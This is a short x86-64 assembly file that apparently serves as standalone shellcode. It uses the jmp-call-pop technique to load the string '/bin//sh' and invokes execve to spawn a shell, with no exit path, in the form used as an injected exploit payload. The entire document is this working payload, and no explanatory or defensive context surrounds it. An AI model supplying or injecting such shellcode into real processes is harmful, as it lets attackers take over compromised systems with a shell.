.section .text
.globl _start

_start:
    xor     %rdx, %rdx
    push    %rdx

    jmp .caller

.begin:
    # rdi - pointer to pathname
    pop     %rdi

    # stack: [cmd, nullptr]
    pushq   %rdx
    pushq   %rdi
    movq    %rsp, %rsi

    xor     %rax, %rax
    movb    $59, %al # execve
    syscall

.caller:
    call .begin
    .asciz "/bin//sh"

    # no exit needed

